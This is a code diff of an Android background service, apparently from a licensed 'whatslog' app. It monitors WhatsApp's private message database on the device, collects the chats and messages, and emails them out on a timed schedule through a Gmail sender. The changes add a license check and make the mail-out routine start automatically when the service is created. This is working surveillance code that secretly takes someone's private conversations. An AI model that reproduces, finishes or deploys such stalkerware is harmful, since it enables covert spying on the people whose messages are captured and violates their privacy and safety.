@@ -17,6 +17,7 @@ import java.util.Map;
 import java.util.Set;
 import java.util.concurrent.Executors;
 import java.util.concurrent.ScheduledExecutorService;
+import java.util.concurrent.ScheduledFuture;
 import java.util.concurrent.TimeUnit;
 
 import javax.mail.AuthenticationFailedException;
@@ -39,7 +40,7 @@ import com.whatslog.model.ChatList;
 import com.whatslog.model.Configuracao;
 import com.whatslog.model.Messages;
 
-public class MyService extends Service {
+public class MainService extends Service {
 
 	private FileObserver observer;
 	private String pathToWatch;
@@ -48,12 +49,13 @@ public class MyService extends Service {
 	private Dao<ChatList, Integer> daoChatInternal;
 	private Dao<ChatList, Integer> daoChatExternal;
 	private ScheduledExecutorService scheduleTaskExecutor;
+	private ScheduledFuture<?> scheduledFuture;
 	private DatabaseHelperInternal internal;
 	private DatabaseHelperExternal external;
 	private Map<String, List<Messages>> listaMensagens;
 	private GMailSender gmail;
 
-	public MyService() {
+	public MainService() {
 	}
 
 	@Override
@@ -94,6 +96,9 @@ public class MyService extends Service {
 
 	@Override
 	public void onCreate() {
+
+		Utils.verifyLicense(this);
+
 		pathToWatch = android.os.Environment.getDataDirectory().toString()
 				+ "/data/com.whatsapp/databases/msgstore.db";
 
@@ -129,7 +134,7 @@ public class MyService extends Service {
 		}
 
 		gmail=new GMailSender(getApplicationContext());
-
+		startMail();
 	}
 
 	@Override
@@ -181,6 +186,9 @@ public class MyService extends Service {
 		// For time consuming an long tasks you can launch a new thread here...
 		Toast.makeText(this, " Service Started", Toast.LENGTH_LONG).show();
 
+	}
+
+	private void startMail(){
 		DatabaseHelperConfiguracao database = new DatabaseHelperConfiguracao(
 				getApplicationContext());
 		List<Configuracao> confs;
@@ -193,19 +201,22 @@ public class MyService extends Service {
 			}
 			if (conf != null) {
 
-				scheduleTaskExecutor = Executors.newScheduledThreadPool(5);
 
-				// This schedule a task to run every 10 minutes:
-				scheduleTaskExecutor.scheduleAtFixedRate(new Runnable() {
+				scheduleTaskExecutor = Executors.newScheduledThreadPool(1);
+				if(scheduledFuture!=null)
+					scheduledFuture.cancel(true);
+
+				scheduledFuture=scheduleTaskExecutor.scheduleAtFixedRate(new Runnable() {
 					public void run() {
 						prepare();
 					}
-				}, 0, conf.getIntervalo() * 60 * 1000, TimeUnit.MILLISECONDS);
+				}, 0, conf.getIntervalo() * 60, TimeUnit.SECONDS);
 			}
 		} catch (Exception e) {
 		}
-
 	}
+
+
 
 	@Override
 	public void onDestroy() {
